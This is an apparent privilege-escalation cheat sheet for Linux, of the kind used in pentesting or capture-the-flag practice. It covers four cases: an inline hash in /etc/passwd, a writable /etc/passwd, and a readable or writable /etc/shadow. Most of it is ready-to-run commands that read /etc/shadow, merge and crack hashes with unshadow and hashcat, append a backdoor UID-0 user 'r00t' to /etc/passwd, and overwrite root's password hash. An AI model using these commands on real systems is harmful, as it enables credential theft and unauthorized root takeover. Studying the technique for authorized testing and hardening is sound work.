/etc/passwd lists users; /etc/shadow holds password hashes. If passwd carries an inline hash or is writable, or shadow is readable/writable, that's root.
## Goal
Read crackable hashes / spot odd users, OR write a UID-0 user into /etc/passwd, OR crack root from a readable /etc/shadow.
## Tips
The 2nd field of /etc/passwd is normally `x` (hash lives in shadow). If it's NOT `x`, a hash is sitting in a world-readable file — crack it.

Checklist:
- [ ] any /etc/passwd line with a hash in field 2 (not `x`)?
- [ ] odd/extra users (vagrant, a service user with a shell)?
- [ ] is /etc/passwd writable? `ls -l /etc/passwd`
- [ ] is /etc/shadow readable or writable? `ls -l /etc/shadow`
# Commands

### Step 1: Enumerate
```bash
cat /etc/passwd                      # users + inline hashes (field 2 != x)
ls -l /etc/passwd /etc/shadow        # check write / read perms
cat /etc/shadow 2>/dev/null          # readable? -> crack root
```

### Step 2: crack prep
```bash
unshadow /etc/passwd /etc/shadow > unshadow.txt   # if you can read both
```

## Exploit
### Case 1: Inline hash in /etc/passwd
**Enumerate:**
```bash
cat /etc/passwd
# if you see something like:
root:$1$xyz$abc...:0:0:root:/root:/bin/bash   # <- hash in field 2, not 'x'
```
**Exploit:**
```bash
# crack it (type by prefix: $1$=md5crypt -m 500, $6$=sha512 -m 1800)
hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt
su root
```

### Case 2: Writable /etc/passwd
**Enumerate:**
```bash
ls -l /etc/passwd
# -rw-rw-rw- (or you have write) -> add a UID-0 user
```
**Exploit:**
```bash
openssl passwd -1 -salt x pass123                       # -> $1$x$<hash>
echo 'r00t:$1$x$<hash>:0:0::/root:/bin/bash' >> /etc/passwd
su r00t                                                 # pass123 -> root
```

### Case 3: Readable /etc/shadow
**Enumerate:**
```bash
ls -l /etc/shadow
# -rw-r--r-- (world-readable) = jackpot
grep root /etc/shadow            # root:$6$...   ($6$ = sha512crypt)
```
**Exploit:**
```bash
unshadow /etc/passwd /etc/shadow > u.txt
hashcat -m 1800 u.txt /usr/share/wordlists/rockyou.txt   # $6$ sha512crypt
su root
```

### Case 4: Writable /etc/shadow
**Enumerate:**
```bash
ls -l /etc/shadow     # writable -> overwrite root's hash
```
**Exploit:**
```bash
openssl passwd -6 -salt x pass123          # -> $6$x$<hash>
# replace root's hash field in /etc/shadow with that, then:
su root                                    # pass123
```

## Helpline:
1. /etc/passwd field format
```
name:passwd:UID:GID:comment:home:shell
root:x:0:0:root:/root:/bin/bash
      ^x = hash is in shadow; anything else = hash sitting HERE
UID 0 = root.
```

2. Generate a hash
```
openssl passwd -1 -salt x pass123     # $1$ md5crypt
openssl passwd -6 -salt x pass123     # $6$ sha512crypt
```

3. hashcat modes by prefix
```
$1$ md5crypt -m 500 | $5$ sha256 -m 7400 | $6$ sha512 -m 1800 | $y$ yescrypt -m 28400
```

4. unshadow
```
unshadow /etc/passwd /etc/shadow > out   # merge for john/hashcat
```
